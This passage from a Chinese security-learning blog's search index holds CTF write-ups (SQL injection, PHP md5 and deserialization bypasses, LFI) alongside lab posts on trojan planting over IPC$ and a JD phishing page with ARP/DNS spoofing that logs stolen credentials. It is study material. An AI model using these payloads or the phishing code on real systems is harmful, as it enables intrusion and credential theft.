http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history 获得zip -r flagbak.zip ./* 访问 http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip file_get_contents查看源码获取被注释的内容 $file = $_GET['file']; if(@file_get_contents($file) == \"meizijiu\")&#123; echo $nctf; &#125; 分析可得 通过get方式传递flle=文件名并且这个文件的内容==‘meizijiu’如果等于就打印flag php伪协议php://input来构造原始数据的只读流 变量覆盖参考 https://blog.csdn.net/niexinming/article/details/52637773?utm_source=blogxgwz1 源码 &lt;!--foreach($_GET as $key =&gt; $value)&#123; $$key = $value; &#125; if($name == \"meizijiu233\")&#123; echo $flag; &#125;--&gt; GET: ?name=meizijiu233","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"弱类型","slug":"弱类型","permalink":"https://sunzhengyu99.github.io/tags/%E5%BC%B1%E7%B1%BB%E5%9E%8B/"},{"name":"php","slug":"php","permalink":"https://sunzhengyu99.github.io/tags/php/"},{"name":"变量覆盖","slug":"变量覆盖","permalink":"https://sunzhengyu99.github.io/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"}]},{"title":"nctf","date":"2020-08-29T14:38:08.000Z","path":"2020/08/29/nctf/","text":"nctf-1 签到题查看源码即可看到flag md5 collision一道简单的md5漏洞题目 md5函数漏洞 源码 $md51 = md5('QNKCDZO'); $a = @$_GET['a']; $md52 = @md5($a); if(isset($a))&#123; if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123; echo \"nctf&#123;*****************&#125;\"; &#125; else &#123; echo \"false!!!\"; &#125;&#125; else&#123;echo \"please input a\";&#125; 即使用get方式传递一个参数a,使得a的值不等于QNKCDZO但是二者的md5值相同 PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 常见的payload有 QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a sha1(str) sha1('aaroZmOk') sha1('aaK1STfY') sha1('aaO8zKZF') sha1('aa3OFF9m') 签到2提示输入口令，尝试输入发现只能输入十个字母，但是口令有11个字母 F12审查元素，修改输入框的maxlength值，大于11即可 再次输入口令即可。 考点为前端代码修改 这题不是WEB这道题还真不是web 进入题目链接，发现一张动图，本能的将其拖入动图查看器种，结果什么都没发现，于是打开winhex 在最后发现flag 层层递进 题目为层层递进，通过F12中Sources功能，查看网站的包含情况，发现到可疑地址：SO.html，查看发现相似可以地址，最后在404.html源码中得到flag（竖排插入在标签中）： 单身二十年tip:在这里找key 点击发现url改变，跳转到了另一个页面 bp抓包试试，go一下，相应包中出现flag phpencode一开始以为是解码，结果发现代码逻辑不对，直接运行php代码，出错 将最后的eval改为echo,提交运行即可 LFI 黑盒判断方法：单纯的从URL判断的话，URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞。 根据PHP伪协议尝试构造如下Payload：?file=php://filter/read=convert.base64-encode/resource=index.php，将index.php的源码经过Base64编码输出 PGh0bWw+CiAgICA8dGl0bGU+YXNkZjwvdGl0bGU+CiAgICAKPD9waHAKCWVycm9yX3JlcG9ydGluZygwKTsKCWlmKCEkX0dFVFtmaWxlXSl7ZWNobyAnPGEgaHJlZj0iLi9pbmRleC5waHA/ZmlsZT1zaG93LnBocCI+Y2xpY2sgbWU/IG5vPC9hPic7fQoJJGZpbGU9JF9HRVRbJ2ZpbGUnXTsKCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpewoJCWVjaG8gIk9oIG5vISI7CgkJZXhpdCgpOwoJfQoJaW5jbHVkZSgkZmlsZSk7IAovL2ZsYWc6bmN0ZntlZHVsY25pX2VsaWZfbGFjb2xfc2lfc2lodH0KCj8+CjwvaHRtbD4= base64解码 &lt;html&gt; &lt;title&gt;asdf&lt;&#x2F;title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125; $file&#x3D;$_GET[&#39;file&#39;]; if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); &#x2F;&#x2F;flag:nctf&#123;edulcni_elif_lacol_si_siht&#125; ?&gt; &lt;&#x2F;html&gt; 单身一百年也没用与单身二十年一样，抓包即可 cookie Cookie，有时也用其复数形式 Cookies。类型为“小型文本文件”，是某些网站为了辨别用户身份，进行Session跟踪而储存在用户本地终端上的数据（通常经过加密），由用户客户端计算机暂时或永久保存的信息 。 TIP: 0==not bp抓包，将cookie:login = 0改cookie:login=1 go MYSQL进入题目，提示robots协议 robots协议也叫robots.txt（统一小写）是一种存放于网站根目录下的ASCII编码的文本文件，它通常告诉网络搜索引擎的漫游器（又称网络蜘蛛），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。因为一些系统中的URL是大小写敏感的，所以robots.txt的文件名应统一为小写。robots.txt应放置于网站的根目录下。如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots元数据（Metadata，又称元数据）。 robots协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。 查看robots.txt url:http://chinalover.sinaapp.com/web11/robots.txt TIP:sql.php //这里提示sql.php的源码如下 &lt;?php if($_GET[id]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query(\"select content from ctf2 where id='$id'\")); if ($_GET[id]==1024) &#123; echo \"&lt;p&gt;no! try again&lt;/p&gt;\"; &#125; else&#123; echo($query[content]); &#125; &#125; ?&gt; 大致意思：get方式传递一个id的参数,创建一个新的参数id存放取整后的值（intval()函数将参数变为整形） 之后将新的$id带入sql语句中查询。if语句中说明，get方式传递的值不能为1024。 http://chinalover.sinaapp.com/web11/sql.php?id=10 尝试id=10，无结果 id=1024出现 no! try again，说明只有id=1024的时候才会执行if语句 想到了intval()函数的作用，尝试id=1024.1 GBK Injection宽字节注入，之前写过。 /x00if (isset ($_GET['nctf'])) &#123; if (@ereg (\"^[1-9]+$\", $_GET['nctf']) === FALSE) echo '必须输入数字才行'; else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE) die('Flag: '.$flag); else echo '骚年，继续努力吧啊~'; &#125; 试了试?nctf[]=1,出现了报错但是答案真就出来了 正儿八经的做法是?nctf=1%00%23biubiubiu，简单的代码审计 bypass again&lt;?php if (isset($_GET['a']) and isset($_GET['b'])) &#123; if ($_GET['a'] != $_GET['b']) if (md5($_GET['a']) == md5($_GET['b'])) die('Flag: '.$flag); else print 'Wrong.'; &#125; ?&gt; 代码审计，get方式传递参数a和b,二者的值不同，但是md5值不同，此处又利用md5()漏洞 在PHP中，MD5是不能处理数组的，md5(数组)会返回null，所以md5(a[])null,md5(b[])null，md5(a[])=md5(b[])=null,这样就得到答案了。 payload: http://chinalover.sinaapp.com/web17/index.php?a[]=1&amp;b[]=3 伪装者bp抓包，添加X-Forwarded-For=127.0.0.1,发包即可 X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"md5","slug":"md5","permalink":"https://sunzhengyu99.github.io/tags/md5/"},{"name":"代码审计","slug":"代码审计","permalink":"https://sunzhengyu99.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"bypass","slug":"bypass","permalink":"https://sunzhengyu99.github.io/tags/bypass/"}]},{"title":"SSTI","date":"2020-08-16T14:08:06.000Z","path":"2020/08/16/SSTI/","text":"https://www.cnblogs.com/wangtanzhi/p/12238779.html","tags":[{"name":"STTI","slug":"STTI","permalink":"https://sunzhengyu99.github.io/tags/STTI/"}]},{"title":"Bugku","date":"2020-08-08T14:40:51.000Z","path":"2020/08/08/Bugku/","text":"Bugku刷题 成绩单1' and 1=1 # 1' and 1=2 # 不显示内容，可以判断存在注入点 手工注入1.1&#39; order by 4#可正常显示可以判断存在四个字段2.爆数据库` -1&apos; union select 1,database(),3,4 #` database:skctf_flag3.爆出表名-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 # table:fl4g,sc 4.字段名-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 # skctf_flag 得到flag (select skctf_flag from skctf_flag.fl4g) sqlmap 因为本题提交数据的方式为post，故需要先用bp抓数据包，保存到sqlmap的路径中 1.获取数据库python2 sqlmap.py -r a.txt --dbs 2.获取表名python2 sqlmap.py -r a.txt -D skctf_flag --tables 3.获取列名python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g --columns 4.获取flagpython2 sqlmap.py -r a.txt -D skctf_flag -T fl4g -C skctf_flag --dump 备份是个好习惯 扫描发现了index.php，通过 index.php.bak下载网页源码 &lt;?php /** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22 */ include_once \"flag.php\"; ini_set(\"display_errors\", 0); $str = strstr($_SERVER['REQUEST_URI'], '?'); $str = substr($str,1); $str = str_replace('key','',$str); parse_str($str); echo md5($key1); echo md5($key2); if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag.\"取得flag\"; &#125; ?&gt; 对上传的值进行了过滤key, kekeyy可以绕过 1.md5函数无法处理数组，将两个参数设置为数组类型经过md5函数加密后都为NULL故二者相等 payload: ?kekey1[]=da&amp;kekey2[]=dada 2.利用==比较漏洞 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。 下列的字符串的MD5值都是0e开头的： QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a 多次爆数据库名 http://123.206.87.240:9004/1ndex.php?id=-1&#39; ununionion seselectlect 1,database() --+ database:web1002-1 爆表名 http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() --+flag1,hint 爆字段名 http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name= &apos;flag1&apos; --+flag1,address获取内容 http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(flag1) from flag1 --+usOwycTju+FTUUzXosjr 提交发现不对 http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(address) from flag1 --+获取address中的内容 ./Once_More.php下一关地址得到另外一个地址 http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;~&apos;),3) %23给出提示XPATH syntax error: ‘class,flag2‘ http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(column_name) from information_schema.columns where table_name=flag2),&apos;~&apos;),3) %23Unknown column ‘flag2’ in ‘where clause’ http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(flag2) from flag2),&apos;~&apos;),3) %23XPATH syntax error: ‘flag{Bugku-sql_6s-2i-4t-bug}‘ ！！！注意把flag改为小写字母 宽字节注入靶场：http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1 一、手工注入第一步 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27加单引号报错 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos; union select 1,table_name from information_schema.tables where table_schema=database()%23查看所有的表 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23查看表中的列 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name=0x637466 %23 ctf,ctf2,ctf3,ctf4,gbksqli,news0x637466 为十六进制ctf 获取字段内容 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos; union select 1,group_concat(pw) from ctf %23flag:nctf{h4cked_By_w00dPeck3r} 二、sqlmap注入检测是否有注入点 sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27没有成功使用十六进制 sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27 --hex获取数据库名 sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27 --hex --dbs //选择十六进制 获取数据库名 单引号使用url编码获取表名 sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27 --hex --D sae-chinalover --tables获取flag sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27 --hex -D sae-chinalover -T ctf --dump","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"}]},{"title":"木马","date":"2020-07-18T12:34:10.000Z","path":"2020/07/18/木马/","text":"初识木马 实验目的使用灰鸽子软件以及端口爆破软件控制目的主机 准备一台xp，一台2003其中xp地址为10.1.1.3/24 2003为10.1.1.1/24使两个主机能够通信xp作为攻击方，2003为受害者 1.制作木马使用灰鸽子制作木马，将木马生成在在桌面（记住路径之后要使用） 2.扫描主机，并对账号密码进行爆破ip起始地址为10.1.1.1-10.1.1.255密码配置文件其实只要扫描10.1.1.1即可（因为是实验） 获取账号密码username：administratorpassword: “” 3.与目标主机建立IPC$net use \\\\10.1.1.1\\ipc$ &quot;&quot; \\user:administrator 4.植入木马到目标主机copy C:\\Documents and Settings\\shimisi\\桌面\\qq.exe \\\\10.1.1.1\\ipc$ 5.设置目标主机运行木马net time \\\\10.1.1.1根据目标主机时间设置事物的开始时间at \\\\10.1.1.1 17:17 c:\\qq.exe在上面的时间之后三分钟左右设置一个事物即在17：17时运行木马文件 6.成功控制目标主机观察目标主机已自动上线，已可以进行监控或传输数据等操作 获取屏幕内容 控制命令行","tags":[]},{"title":"jdtest","date":"2020-07-18T09:42:34.000Z","path":"2020/07/18/jdtest/","text":"爬取京东商品图片的小测试 访问的页面图片链接的位置 # -*- coding = utf - 8 -*- #@Time : 2020/7/16 14:54 #@Author : sunzy #@File : jd.py import re import requests import time import os dir = \"jdtp\" if not os.path.exists(dir): os.mkdir(dir) baseurl = \"https://search.jd.com/Search?keyword=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;enc=utf-8&amp;wq=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;pvid=ryxp9pui.nhltvu\" head = &#123; \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61\" &#125; response = requests.get(url=baseurl, headers = head) #print(response.text) html = response.text findlinks = '&lt;img width=\"220\" height=\"220\" data-img=\"\\d\" src=\"(.*?)\".*?&gt;' #&lt;img width=\"220\" height=\"220\" data-img=\"1\" src=\"//img10.360buyimg.com/n7/jfs/t22093/305/286523587/498951/2ddddbdf/5b30b30dNd6c7eca0.jpg\" data-lazy-img=\"done\" source-data-lazy-img=\"\"&gt; urls = re.findall(findlinks, html) for url in urls: time.sleep(1) file_name = url.split('/')[-1] res = requests.get(\"http:\"+url,headers = head) with open(dir+'/'+file_name, \"wb\") as f: f.write(res.content)","tags":[{"name":"python","slug":"python","permalink":"https://sunzhengyu99.github.io/tags/python/"}]},{"title":"sqlmap","date":"2020-07-18T09:42:34.000Z","path":"2020/07/18/sql注入/","text":"sqlmap使用 第一步: -u &quot;xx” --cookie= &quot;yyy&quot; //带上cookie对URL进行注入探测第二步: -u &quot;xxx” --cookie= &quot;yy&quot; - current--db //对数据库名进行获取第三步: -u &quot;xxx&quot; --cookie=&quot;yyy&quot; -D dvwa --tables //对数据库dvwa的表名进行枚举第四步: -u &quot;xx&quot; --cookie= &quot;yyy&quot; -D dvwa -T users --columns //对dvwa库里面的名为users表的列名进行枚举第五步: -u&quot;xxx&quot;--cookie=&quot;yyy&quot; -D dvwa -T users -C name,password - dump //探测user表name和password字段如果此时得到的密码为密文, SQLmap会自动询问，是否爆破,选择”是”即可开始使用SQLMAP自带的字典进行爆破。 第六步: -u&quot;xxx&quot;--cookie= &quot;yy&quot; --os - shell //获取shell,选择后台语言sql注入order by * group by * 利用内置函数暴数据库信息 version() 查看数据库版本 database() 查看当前数据库名 user() 查看当前用户 查看表： Select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() 可十六进制查看字段： select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=‘biaoming’;","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"}]},{"title":"爬图","date":"2020-07-18T09:40:51.000Z","path":"2020/07/18/爬图/","text":"用爬虫爬取小姐姐的图片 用的库 re #正则表达式 requests #url请求 time #时间 os #用于创建文件夹，保存图片 ##准备工作1.首先访问该链接https://www.vmgirls.com/2.随便点击一个进入查看详情https://www.vmgirls.com/13344.html3.F12审查元素网查看页详情，主要查看图片链接的标签位置，写出正则表达式该正则表达式为findlinks = &#39;&lt;a href=&quot;(.*?)&quot; alt=&quot;.*?&quot; title=&quot;.*?&quot;&gt;&#39; 完整程序# -*- coding = utf - 8 -*- #@Time : 2020/7/16 13:36 #@Author : sunzy #@File : tupian.py import re import requests import time import os dir = \"plmm\" #文件夹名字 if not os.path.exists(dir): #首先判断是否存在当前文件夹如果没有则创建一个 os.mkdir(dir) # 模仿浏览器的首部信息，绕过一些网站的反爬取措施 head = &#123; \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61\" &#125; url = \"https://www.vmgirls.com/13344.html\" response = requests.get(url, headers = head) # 访问目标网页，获取网页内容 html = response.text findlinks = '&lt;a href=\"(.*?)\" alt=\".*?\" title=\".*?\"&gt;' urls = re.findall(findlinks, html) #爬取到的图片链接保存在urls中， 是一个列表 for url in urls: time.sleep(1) #防止访问速度过快使服务器崩溃 file_name = url.split('/')[-1] #保存图片的名字 res = requests.get(url, headers = head) #依此访问图片链接 with open(dir+'/'+file_name, \"wb\") as f: #以二进制形式保存图片 f.write(res.content)","tags":[{"name":"爬虫","slug":"爬虫","permalink":"https://sunzhengyu99.github.io/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"diaoyu","date":"2020-07-18T09:37:15.000Z","path":"2020/07/18/diaoyu/","text":"DNS欺骗、ARP攻击及钓鱼网站制作 1.实验目的获取登录jd网页的用户名和密码2.实验主机一台kali,两台win2003,其中一台为客户机，一台为服务器，kali作为攻击者3.实验材料京东登录网页及其所有图片（浏览器访问https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F 之后保存网页即可）修改index.html中的内容error.php中的内容如下关键代码（用于保存用户名和密码以及迷惑用户） &lt;?php $nam = stripslashes($_POST['name']); //name 是由网页的表单信息决定，不同的网页对应不同的内容，这一点很重要 $pas = stripslashes($_POST['pass']);//pass也一样 $content = \"您已捕获京东账号及密码1个：\" . \" 用户名 \" . $nam . \" 密码 \" . $pas; //保存捕获的用户名和密码 $filed = @fopen(\"1.txt\", \"a+\"); //打开1.txt @fwrite($filed, \"$content\\n\"); //将用户名和密码写入1.txt ?&gt; &lt;html&gt; &lt;head&gt; &lt;script type=\"text/javascript\"&gt; function goBack() &#123; window.history.back() //后退+刷新 &#125; &lt;/script&gt; &lt;/head&gt; &lt;body onload=\"goBack()\"&gt; &lt;!-- 加载之后立即执行一段 JavaScript --&gt; &lt;/body&gt; &lt;/html&gt; 4.实验拓扑图 实验步骤一.部署京东的服务器1.安装DNS和web服务器（具体步骤略）2.配置DNS服务器a.在正向解析中建一个区域名字为jd ip为服务器地址（10.1.1.1）b.在jd域中新建一台主机 www.jd.com ip:10.1.1.1 2.IISa.将默认网站停止b.新建网站jd.com,文件路径为保存的jd网页c.打开web服务中的asp（因为此网站不是静态网站）（使用2003客户机访问www.jd.com看看网站发布是否成功） 二.部署kali1.将钓鱼网页的所有文件放到 kali 的/var/www/html/路径下， 并修改 1.txt 的权限， 使这个文档可以写入数据。2.开启apache服务，并检查80端口是否已开启systemctl start apache2netstat -antpl3.修改DNS欺骗配置文件，使用 vim 编辑器， 命令：vim /etc/ettercap/etter.dns，然后 添加一条 A 记录，添加一条 PTR 记录，使用户访问www.jd.com，指向为10.1.1.2 选中一行后，按两次d可删除内容想要编辑时，先按i(insert)编辑结束后 :wq 保存4.打开ettercap软件5.选择sniff–unified sniffing，并选择监听eth06.然后选择Hosts——Scan for hosts–扫描完成后选择Hosts——Hosts list,可以看到扫描到的主机7.添加欺骗记录选中10.1.1.1，点击Add to Target 1 选中10.1.1.3，点击Add to Target 28.在Mitm选择ARP欺骗在弹出的窗口中，勾选第一个点击确定9.选择plugins – Manage the plugins，准备进行DNS欺骗在弹出的窗口中， 找到 dns spoof 并双击出现*号，开始DNS欺骗 三.用户访问登录页面1.在客户机中在中，再次登录www.jd.com输入用户名密码然后点击登录 2.在kali虚拟机中，已经钓鱼成功，并钓到京东的登录账户及密码(cat 1.txt)","tags":[{"name":"DNS","slug":"DNS","permalink":"https://sunzhengyu99.github.io/tags/DNS/"}]},{"title":"guestbook","date":"2020-04-18T09:42:34.000Z","path":"2020/04/18/Guestbook/","text":"guestbook 题目提示：This guestbook sucks. sqlmap is your friend. 是sql注入点击Message List 时是空的， 点击post是可以提交新信息，点击查看新信息 在id值后加上” ‘ “测试是否存在测试点网页报错说明存在注入点union 注入!查看列 https://hackme.inndy.tw/gb/?mod=read&amp;id=-1%20union%20select%201,2,3,4%20# //id=-1 是让前面的内容不显示 3被回显 1.查看数据库名 https://hackme.inndy.tw/gb/?mod=read&amp;id=-1%20union%20select%201,2,database(),4%20# 数据库的名字g8 2.查看表名 https://hackme.inndy.tw/gb/?mod=read&amp;id=-1 union select 1,2,(select table_name from information_schema.tables where table_schema=database() limit 0,1),4# 发现有一个表 flag 3.测试表的字段 https://hackme.inndy.tw/gb/?mod=read&amp;id=-1 union select 1,2,(select column_name from information_schema.columns where table_name='flag' limit 1,1),4# 仍然显示flag 4.读取flag https://hackme.inndy.tw/gb/?mod=read&amp;id=-1 union select 1,2,(select flag from flag limit 1,1),4# 得到flag!","tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://sunzhengyu99.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"反序列化","date":"2020-03-28T09:42:34.000Z","path":"2020/03/28/php反序列化/","text":"反序列化 PHP魔术方法_ wakeup()是在反序列化操作中起作用的魔法函数， 当unserialize的时候， 会检查时候存在 __ wakeup()函数, 如果存在的话，会优先调用__wakeup()函数。 而wakeup()函数漏洞就是与对象的属性个数有关，如果序列化后的字符串中表示属性个数的数字与真实属性个数一致，那么就调用wakeup()函数, 如果该数字大于真实属性个数，就会绕过__wakeup()函数。 serialize()函数：用于序列化对象或数组，并返回一个字符串。序列化对象后， 可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。 unserialize()函数：用于将通过serialize()函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。 举例说明 &lt;?php class Student{ public $full_name = &apos;zhangsan&apos;; public $score = 150; public $grades = array(); function __wakeup() { echo &quot;__wakeup is invoked&quot;; } } $s = new Student(); var_dump(serialize($s)); ?&gt; O:7:&quot;Student&quot;:3:{s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:{}}各个符号的含义变量类型：类名长度（字节）：类名：属性数量：{属性名类型：属性名长度：属性名：属性值类型：属性值长度：属性值内容} 其中在Stuedent类后面有一个数字3，整个3表示的就是Student类存在3个属性。wakeup()漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。 当我们将上述的序列化的字符串中的对象属性个数修改为5，变为O:7:”Student”:5:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}} 最后执行运行的代码如下: &lt;?php class Student&#123; public $full_name = 'zhangsan'; public $score = 150; public $grades = array(); function __wakeup() &#123; echo \"__wakeup is invoked\"; &#125; function __destruct() &#123; var_dump($this); &#125; &#125; $s = new Student(); $stu = unserialize('O:7:\"Student\":5:&#123;s:9:\"full_name\";s:8:\"zhangsan\";s:5:\"score\";i:150;s:6:\"grades\";a:0:&#123;&#125;&#125;'); ?&gt; 举例说明题目 class xctf&#123; public $flag = '111'; public function __wakeup()&#123; exit('bad requests'); &#125; ?code= &lt;?php class xctf&#123; //定义一个名为xctf的类 public $flag = '111';//定义一个公有的类属性$flag，值为111 public function __wakeup()&#123; //定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本 exit('bad requests'); &#125; &#125; $test = new xctf(); //使用new运算符来实例化该类（xctf）的对象为test echo(serialize($test)); //输出被序列化的对象（test） ?&gt; 输出结果 O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}我们要反序列化xctf类的同时还要绕过wakeup方法的执行（如果不绕过wakeup()方法，那么将会输出bad requests并退出脚本），wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。因此，需要修改序列化字符串中的属性个数：当我们将上述的序列化的字符串中的对象属性个数由真实值1修改为2，即如下所示： O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}访问url?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}","tags":[{"name":"unserialize","slug":"unserialize","permalink":"https://sunzhengyu99.github.io/tags/unserialize/"}]},{"title":"迷宫问题","date":"2020-03-20T10:07:12.000Z","path":"2020/03/20/迷宫问题/","text":"迷宫问题 原题题目描述 小明置身于一个迷宫，请你帮小明找出从起点到终点的最短路程。 小明只能向上下左右四个方向移动。 输入 输入包含多组测试数据。输入的第一行是一个整数T，表示有T组测试数据。 每组输入的第一行是两个整数N和M（1&lt;=N,M&lt;=100）。 接下来N行，每行输入M个字符，每个字符表示迷宫中的一个小方格。 字符的含义如下：‘S’：起点‘E’：终点‘-’：空地，可以通过‘#’：障碍，无法通过 输入数据保证有且仅有一个起点和终点。 输出 对于每组输入，输出从起点到终点的最短路程，如果不存在从起点到终点的路，则输出-1。 样例输入1 5 5 s-### ----- ##--- E#--- ---##样例输出9解决代码#include&lt;iostream&gt; #include&lt;cstring&gt; #include&lt;string&gt; #include&lt;queue&gt; #include &lt;algorithm&gt; using namespace std; int de[100][100];//计步数组 记录走到这个位置所需的步数 不能走到的位置标记为-1 char map[100][100]; //用于存放迷宫地图 typedef pair&lt;int,intP; //坐标 int to[2][4]=&#123;1,-1,0,0,0,0,1,-1&#125;; //在当前坐标下能走的四个方向 int sx,ex,sy,ey; //(sx,sy)为起点坐标 （ex,ey）为终点坐标 int x,y,nx,ny; //(x,y)为函数中当前位置坐标 （nx,ny)为接下来能到达的坐标 int r,l; //r为行数 l为列数 int bfs() &#123; memset(de,-1,sizeof(de)); queue&lt;Pqu; qu.push(P(sx,sy)); //将起点坐标放入队头 de[sx][sy]=0; while(!qu.empty()) &#123; P p=qu.front(); //取出队头坐标 qu.pop() ;//删除对头及走过的坐标 x=p.first,y=p.second; if(x==ex&amp;&amp;y==ey) break; //到达终点 跳出循环 for(int i=0;i&lt;4;i++) &#123; nx=x+to[0][i];//开始向四个方向移动 ny=y+to[1][i]; if(nx&gt;=0&amp;&amp;nx&lt;r&amp;&amp;ny&gt;=0&amp;&amp;ny&lt;l&amp;&amp;map[nx][ny]!='#'&amp;&amp;de[nx][ny]==-1) //判断是否越界 以及是否能走 排除走过的路 &#123; qu.push(P(nx,ny)); //将能走的坐标放入队列 之后依次删除 de[nx][ny]=de[x][y]+1; //步数加一 &#125; &#125; &#125; if(de[ex][ey]==-1) return -1; //终点的记步数组为-1 及不能到达终点 else return de[ex][ey]; &#125; int main() &#123; int n,i,j; while(cin&gt;&gt;n)&#123; while(n--)&#123; cin&gt;&gt;r&gt;&gt;l; for(i=0;i&lt;r;i++)&#123; for(j=0;j&lt;l;j++)&#123; cin&gt;&gt;map[i][j]; if(map[i][j]=='S') //记录起点坐标 &#123; sx=i,sy=j; &#125; else if(map[i][j]=='E') //记录终点坐标 &#123; ex=i,ey=j; &#125; &#125; &#125; cout&lt;&lt;bfs()&lt;&lt;endl; &#125; &#125; return 0; &#125;","tags":[{"name":"bfs","slug":"bfs","permalink":"https://sunzhengyu99.github.io/tags/bfs/"}]}]